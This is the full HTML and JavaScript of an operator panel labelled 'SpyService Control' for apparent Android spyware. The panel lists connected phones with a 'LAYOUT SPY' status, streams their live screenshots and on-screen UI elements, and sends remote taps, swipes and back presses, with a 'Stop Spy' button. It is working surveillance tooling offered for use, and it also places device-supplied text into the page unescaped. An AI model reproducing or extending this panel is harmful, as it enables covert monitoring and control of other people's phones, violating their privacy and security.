<!DOCTYPE html>
<html>
<head>
    <title>üîç SpyService Control - Hybrid Screenshot + Layout</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,20,40,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 300px; 
            border-radius: 15px; backdrop-filter: blur(20px); 
            border: 1px solid #00ff88; box-shadow: 0 0 30px rgba(0,255,136,0.3);
        }
        .device { 
            padding: 15px; margin: 10px 0; background: rgba(255,255,255,0.08); 
            cursor: pointer; border-radius: 12px; transition: all 0.3s; 
            border: 1px solid rgba(0,255,136,0.3); position: relative;
        }
        .device:hover { 
            background: rgba(0,255,136,0.15); transform: translateX(5px); 
            border-color: #00ff88; box-shadow: 0 0 20px rgba(0,255,136,0.4);
        }
        .device.active { 
            background: linear-gradient(45deg, #00ff88, #00cc6a) !important; 
            color: #000; box-shadow: 0 0 30px rgba(0,255,136,0.7) !important;
        }
        .device-status { font-size: 12px; opacity: 0.8; }
        .status-badge { position: absolute; right: 10px; top: 10px; padding: 4px 8px; 
            border-radius: 12px; font-size: 11px; font-weight: bold; }
        .status-active { background: rgba(0,255,136,0.3); color: #00ff88; }
        .status-disconnected { background: rgba(255,68,68,0.3); color: #ff4444; }

        #phone-frame {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 380px; height: 780px; background: linear-gradient(145deg, #1a1a2e, #16213e); 
            border: 25px solid #2a2a4a; border-radius: 50px; cursor: crosshair; touch-action: none;
            box-shadow: 0 40px 80px rgba(0,0,0,0.8), inset 0 0 25px rgba(255,255,255,0.03);
            transition: all 0.3s;
        }
        #phone-frame.fullscreen { 
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            border: none; border-radius: 0; transform: none; margin: 0; z-index: 1000;
        }
        #screen { 
            width: 100%; height: 100%; background: #000; border-radius: 25px;
            position: relative; overflow: hidden; touch-action: none;
        }
        #screenshot-canvas {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            image-rendering: pixelated; image-rendering: -moz-crisp-edges;
        }
        .layout-element {
            position: absolute; border: 2px solid rgba(0,255,136,0.6); 
            border-radius: 6px; cursor: pointer; transition: all 0.2s; 
            backdrop-filter: blur(8px); font-size: 11px; padding: 4px 6px;
            background: rgba(0,255,136,0.15); font-family: monospace;
        }
        .layout-element:hover { 
            border-color: #00ff88 !important; background: rgba(0,255,136,0.4) !important;
            transform: scale(1.05); box-shadow: 0 0 15px rgba(0,255,136,0.8);
        }
        .clickable { border-color: #00ff88 !important; background: rgba(0,255,136,0.3) !important; }
        .text-only { background: rgba(0,170,255,0.25); border-color: rgba(0,170,255,0.6); }
        
        #stats-panel { 
            position: fixed; top: 10px; right: 10px; 
            background: rgba(0,20,40,0.95); padding: 20px; 
            border-radius: 15px; font-size: 13px; border: 1px solid #00ff88;
            backdrop-filter: blur(20px); min-width: 180px;
        }
        .stat-row { margin: 8px 0; display: flex; justify-content: space-between; }
        .stat-value { font-weight: bold; color: #00ff88; }
        
        #controls { 
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            display: flex; gap: 12px; flex-wrap: wrap; justify-content: center;
        }
        button {
            padding: 14px 28px; background: linear-gradient(45deg, #00ff88, #00cc6a); 
            color: #000; border: none; border-radius: 25px; cursor: pointer; 
            font-size: 14px; font-weight: bold; transition: all 0.3s;
            box-shadow: 0 8px 25px rgba(0,255,136,0.4); min-width: 100px;
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,255,136,0.6); }
        button:active { transform: translateY(-1px); }
        .btn-danger { background: linear-gradient(45deg, #ff4444, #cc3333); color: white; }
        .btn-secondary { background: rgba(255,255,255,0.15); color: #00ff88; }
        
        #element-info { 
            position: fixed; bottom: 120px; left: 50%; transform: translateX(-50%);
            background: rgba(0,20,40,0.98); padding: 20px; border-radius: 15px; 
            max-width: 420px; display: none; border: 2px solid #00ff88;
            backdrop-filter: blur(25px); box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            font-family: monospace; font-size: 13px;
        }
        .element-prop { margin: 6px 0; padding: 6px; background: rgba(0,255,136,0.1); 
            border-radius: 6px; border-left: 4px solid #00ff88; }
        
        .crosshair { 
            position: absolute; pointer-events: none; border: 2px solid #00ff88;
            background: rgba(0,255,136,0.2); border-radius: 50%; 
            transform: translate(-50%, -50%); display: none; z-index: 100;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± SpyService Devices</h3>
        <div id="device-list">üîÑ Connecting...</div>
    </div>
    
    <div id="stats-panel">
        <div class="stat-row"><span>Status:</span> <span id="connectionStatus" class="stat-value">Connecting...</span></div>
        <div class="stat-row"><span>FPS:</span> <span id="fps" class="stat-value">0</span></div>
        <div class="stat-row"><span>Elements:</span> <span id="elementCount" class="stat-value">0</span></div>
        <div class="stat-row"><span>Device:</span> <span id="selectedDevice" class="stat-value">-</span></div>
        <div class="stat-row"><span>Size:</span> <span id="screenSize" class="stat-value">-</span></div>
    </div>

    <div id="phone-frame">
        <canvas id="screenshot-canvas"></canvas>
        <div id="screen"></div>
        <div class="crosshair" id="crosshair"></div>
    </div>

    <div id="element-info">
        <h4 id="element-title">-</h4>
        <div id="element-details"></div>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="toggleScreenshot()">üì∏ Screenshot</button>
        <button onclick="toggleLayoutOverlay()">üéØ Layout</button>
        <button onclick="clearScreen()">üßπ Clear</button>
        <button class="btn-secondary" onclick="toggleFullscreen()">‚õ∂ Fullscreen</button>
        <button class="btn-danger" onclick="stopCurrentDevice()">üõë Stop Spy</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2340;
        let elements = [];
        let hoveredElement = null;
        let showScreenshot = true;
        let showLayoutOverlay = true;
        let lastFrameTime = 0, frameCount = 0;
        let imageScaleX = 1, imageScaleY = 1;

        // üî• DOM Elements
        const canvas = document.getElementById('screenshot-canvas');
        const ctx = canvas.getContext('2d');
        const screenDiv = document.getElementById('screen');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const crosshair = document.getElementById('crosshair');

        // üî• Socket Events - EXACT SpyService Protocol
        socket.on('connect', () => {
            document.getElementById('connectionStatus').textContent = '‚úÖ Connected';
            document.getElementById('connectionStatus').style.color = '#00ff88';
        });

        // üî• HYBRID SCREEN-FRAME (Screenshot + Layout)
        socket.on('screen-frame', (frameData) => {
            if (frameData.deviceId !== currentDevice) return;
            
            deviceWidth = frameData.width;
            deviceHeight = frameData.height;
            document.getElementById('screenSize').textContent = `${deviceWidth}x${deviceHeight}`;
            
            // 1Ô∏è‚É£ Screenshot (JPEG 90%)
            if (frameData.screenshot && showScreenshot) {
                const img = new Image();
                img.onload = () => {
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    ctx.imageSmoothingEnabled = false;
                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
                };
                img.src = 'data:image/jpeg;base64,' + frameData.screenshot;
            }
            
            // 2Ô∏è‚É£ üî• LAYOUT ELEMENTS (Primary Feature)
            if (frameData.layout && showLayoutOverlay) {
                elements = frameData.layout;
                renderLayoutOverlay();
            }
            
            // FPS Counter
            frameCount++;
            const now = performance.now();
            if (now - lastFrameTime >= 1000) {
                document.getElementById('fps').textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
                document.getElementById('elementCount').textContent = elements.length;
                frameCount = 0;
                lastFrameTime = now;
            }
        });

        // üî• LAYOUT UPDATES (Every 2s)
        socket.on('layout-update', (layoutData) => {
            if (layoutData.deviceId !== currentDevice) return;
            elements = layoutData.layout;
            if (showLayoutOverlay) renderLayoutOverlay();
        });

        // üî• REGISTERED DEVICES
        socket.on('register-device', (deviceInfo) => {
            addDevice(deviceInfo);
        });

        // üî• LAYOUT RENDERING ENGINE
        function renderLayoutOverlay() {
            screenDiv.innerHTML = '';
            
            const rect = phoneFrame.getBoundingClientRect();
            imageScaleX = deviceWidth / rect.width;
            imageScaleY = deviceHeight / rect.height;
            
            elements.forEach((el) => {
                const bounds = el.bounds;
                const x = bounds.left / imageScaleX;
                const y = bounds.top / imageScaleY;
                const w = bounds.width / imageScaleX;
                const h = bounds.height / imageScaleY;
                
                const elementDiv = document.createElement('div');
                elementDiv.className = `layout-element ${el.clickable ? 'clickable' : 'text-only'}`;
                elementDiv.style.left = x + 'px';
                elementDiv.style.top = y + 'px';
                elementDiv.style.width = w + 'px';
                elementDiv.style.height = h + 'px';
                
                // Text overlay
                const text = (el.text || el.desc || '').substring(0, 25);
                elementDiv.textContent = text || el.class?.substring(el.class.lastIndexOf('.') + 1) || '';
                
                // Title with full info
                elementDiv.title = `${el.text || 'No text'}\n${el.class || 'N/A'}\n${el.clickable ? '‚úÖ Clickable' : '‚ùå Not'}\nCenter: (${Math.round(bounds.centerX)}, ${Math.round(bounds.centerY)})`;
                
                // üî• TAP on CENTER
                elementDiv.onclick = (e) => {
                    e.stopPropagation();
                    sendTap(bounds.centerX, bounds.centerY);
                    showElementInfo(el);
                };
                
                // Hover effects
                elementDiv.onmouseenter = () => highlightElement(elementDiv, el);
                elementDiv.onmouseleave = () => unhighlightElement(elementDiv);
                
                screenDiv.appendChild(elementDiv);
            });
        }

        function highlightElement(elDiv, elData) {
            hoveredElement = elDiv;
            elDiv.style.boxShadow = '0 0 25px rgba(0,255,255,1)';
            elDiv.style.zIndex = '1000';
            elDiv.style.borderWidth = '3px';
            showElementInfo(elData);
        }

        function unhighlightElement(elDiv) {
            if (hoveredElement === elDiv) {
                elDiv.style.boxShadow = '';
                elDiv.style.zIndex = '';
                elDiv.style.borderWidth = '2px';
                hideElementInfo();
            }
        }

        // üî• PERFECT ELEMENT INFO
        function showElementInfo(el) {
            const bounds = el.bounds;
            document.getElementById('element-title').textContent = el.text || el.desc || 'UI Element';
            document.getElementById('element-details').innerHTML = `
                <div class="element-prop"><strong>Class:</strong> ${el.class || 'N/A'}</div>
                <div class="element-prop"><strong>ID:</strong> ${el.id || 'N/A'}</div>
                <div class="element-prop"><strong>Size:</strong> ${bounds.width}√ó${bounds.height}</div>
                <div class="element-prop"><strong>Clickable:</strong> ${el.clickable ? '‚úÖ YES' : '‚ùå NO'}</div>
                <div class="element-prop"><strong>Focusable:</strong> ${el.focusable ? '‚úÖ YES' : '‚ùå NO'}</div>
                <div class="element-prop"><strong>Center:</strong> (${Math.round(bounds.centerX)}, ${Math.round(bounds.centerY)})</div>
                <div class="element-prop"><strong>Depth:</strong> ${el.depth || 0}</div>
            `;
            document.getElementById('element-info').style.display = 'block';
        }

        function hideElementInfo() {
            document.getElementById('element-info').style.display = 'none';
        }

        // üî• DEVICE MANAGEMENT
        function addDevice(deviceInfo) {
            const deviceId = deviceInfo.deviceId;
            let deviceEl = document.getElementById(`device-${deviceId}`);
            
            if (!deviceEl) {
                deviceEl = document.createElement('div');
                deviceEl.id = `device-${deviceId}`;
                deviceEl.className = 'device';
                deviceEl.onclick = () => selectDevice(deviceId, deviceEl);
                document.getElementById('device-list').appendChild(deviceEl);
            }
            
            deviceEl.innerHTML = `
                <div style="font-weight: bold; font-size: 15px;">üì± ${deviceInfo.model || deviceId.slice(0,12)}</div>
                <div class="device-status">${deviceInfo.brand || ''} Android ${deviceInfo.version || '?'}</div>
                <div class="device-status">${deviceInfo.screen || 'Unknown'}</div>
                <span class="status-badge status-${deviceInfo.status === 'layout-spy-active' ? 'active' : 'disconnected'}">
                    ${deviceInfo.status === 'layout-spy-active' ? 'üîç LAYOUT SPY' : '‚ùå OFFLINE'}
                </span>
            `;
            
            if (!currentDevice) selectDevice(deviceId, deviceEl);
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.getElementById('selectedDevice').textContent = deviceId.slice(0,12);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            
            // üî• Tell server we're selecting this device
            socket.emit('select-device', deviceId);
        }

        // üî• TOUCH/MOUSE ‚Üí EXACT COORDINATES
        let startPos = { x: 0, y: 0 }, isDragging = false;
        
        function getDeviceCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            return {
                x: Math.floor((clientX - rect.left) * imageScaleX),
                y: Math.floor((clientY - rect.top) * imageScaleY)
            };
        }

        // Mouse events
        ['mousedown'].forEach(ev => phoneFrame.addEventListener(ev, e => {
            e.preventDefault();
            isDragging = true;
            const coords = getDeviceCoords(e.clientX, e.clientY);
            startPos = coords;
            updateCrosshair(e.clientX, e.clientY);
        }));

        ['mousemove'].forEach(ev => phoneFrame.addEventListener(ev, e => {
            if (!isDragging || !currentDevice) return;
            e.preventDefault();
            const coords = getDeviceCoords(e.clientX, e.clientY);
            sendSwipe(startPos.x, startPos.y, coords.x, coords.y);
            updateCrosshair(e.clientX, e.clientY);
        }));

        ['mouseup'].forEach(ev => phoneFrame.addEventListener(ev, e => {
            if (isDragging && currentDevice) {
                const coords = getDeviceCoords(e.clientX, e.clientY);
                sendTap(coords.x, coords.y);
            }
            isDragging = false;
            crosshair.style.display = 'none';
        }));

        // Touch events
        ['touchstart'].forEach(ev => phoneFrame.addEventListener(ev, e => {
            e.preventDefault();
            const touch = e.touches[0];
            isDragging = true;
            const coords = getDeviceCoords(touch.clientX, touch.clientY);
            startPos = coords;
            updateCrosshair(touch.clientX, touch.clientY);
        }));

        ['touchmove'].forEach(ev => phoneFrame.addEventListener(ev, e => {
            e.preventDefault();
            if (!isDragging || !currentDevice) return;
            const touch = e.touches[0];
            const coords = getDeviceCoords(touch.clientX, touch.clientY);
            sendSwipe(startPos.x, startPos.y, coords.x, coords.y);
            updateCrosshair(touch.clientX, touch.clientY);
        }));

        ['touchend'].forEach(ev => phoneFrame.addEventListener(ev, e => {
            e.preventDefault();
            if (isDragging && currentDevice) {
                const touch = e.changedTouches[0];
                const coords = getDeviceCoords(touch.clientX, touch.clientY);
                sendTap(coords.x, coords.y);
            }
            isDragging = false;
            crosshair.style.display = 'none';
        }));

        function updateCrosshair(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            crosshair.style.left = (clientX - rect.left) + 'px';
            crosshair.style.top = (clientY - rect.top) + 'px';
            crosshair.style.width = '24px';
            crosshair.style.height = '24px';
            crosshair.style.display = 'block';
        }

        // üî• CONTROL COMMANDS (Exact SpyService format)
        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'tap', 
                x, y 
            });
            console.log(`üëÜ Tap: (${x}, ${y})`);
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, 
                endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'back' 
            });
            console.log('üîô Back pressed');
        }

        // üî• UI Controls
        function toggleScreenshot() {
            showScreenshot = !showScreenshot;
            canvas.style.opacity = showScreenshot ? '1' : '0.2';
        }

        function toggleLayoutOverlay() {
            showLayoutOverlay = !showLayoutOverlay;
            screenDiv.style.opacity = showLayoutOverlay ? '1' : '0.2';
            if (showLayoutOverlay) renderLayoutOverlay();
        }

        function clearScreen() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            screenDiv.innerHTML = '';
        }

        function toggleFullscreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen().catch(() => {});
            } else {
                document.exitFullscreen();
            }
        }

        function stopCurrentDevice() {
            if (!currentDevice) return;
            socket.emit('stop-device', currentDevice);
            currentDevice = null;
            document.getElementById('selectedDevice').textContent = '-';
            clearScreen();
        }

        // üî• Initial load devices
        setInterval(() => {
            if (Math.random() < 0.1) { // Auto refresh every ~10s
                socket.emit('get-devices');
            }
        }, 10000);

        // Double-click back
        phoneFrame.ondblclick = sendBack;
    </script>
</body>
</html>
